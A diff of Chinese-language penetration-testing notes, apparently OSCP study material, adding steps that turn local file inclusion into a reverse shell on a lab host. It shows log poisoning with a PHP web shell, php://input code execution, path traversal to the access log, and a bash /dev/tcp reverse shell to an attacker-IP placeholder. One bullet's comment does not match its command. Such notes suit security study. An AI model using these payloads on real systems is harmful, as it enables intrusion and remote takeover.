@@ -211,13 +211,45 @@ fetch(`/getflag\)
     
 
 ### LFI
-只是能讀取到victim server上的file content，不見得會有價值，需要搭配其他手法，例如
-1. 寫入webshell之類的達到RCE
-2. 利用PHP的偽協議達到讀特殊檔案的需求
+只是能讀取到 victim server 上的 file content，不見得會有價值，需要搭配其他手法，例如
+1. 寫入 webshell 之類的達到 RCE
+2. 利用 PHP 的偽協議達到讀特殊檔案的需求
    * `http://victim.io/?page=php://filter/convert.base64-encode/resource=<file path>`
 
+#### 利用 LFI 拿 reverse shell
+* PHP filter + base64（確認能讀檔）
+    ```bash
+    # 先在 User-Agent 注入 PHP：
+    $ curl "http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=index"
+
+    # 然後包含 access log：
+    $ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=id"
+    ```
+* Log poisoning（較常見於 OSCP）
+    ```bash
+    $ curl -A "<?php system(\$_GET['cmd']); ?>" http://mountaindesserts.local/meteor/index.php
+    ```
+* php://input 或 data:// wrapper
+    ```bash
+    $ curl -X POST "http://mountaindesserts.local/meteor/index.php?page=php://input" -d "<?php system('id'); ?>"
+    ```
+
+確認 RCE 後，送 reverse shell
+```bash
+$ nc -lvnp 4444
+```
+透過 RCE 執行：
+```bash
+bash -c 'bash -i >& /dev/tcp/<攻擊者IP>/4444 0>&1'
+↓
+$ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<攻擊者IP>%2F4444%200%3E%261%22" 
+```
+
 ### Deserialization
-要能夠達成insecure的反序列化，最重要的兩個前提是1) 反序列化的資料可控 2) 針對各個語言反序列化時或之後會觸發哪些magic method
+要能夠達成insecure的反序列化，最重要的兩個前提是
+* 反序列化的資料可控
+* 針對各個語言反序列化時或之後會觸發哪些magic method
+
 * 可以搭配command injection
 * php可以搭配`phar`
 * POP Chain: 幾乎每個語言都會有類似的問題存在，最常出現在 PHP 反序列化漏洞（PHP Object Injection） 裡。把一堆「本來正常的 class 功能」串起來，變成可以執行惡意行為的一條攻擊鏈。
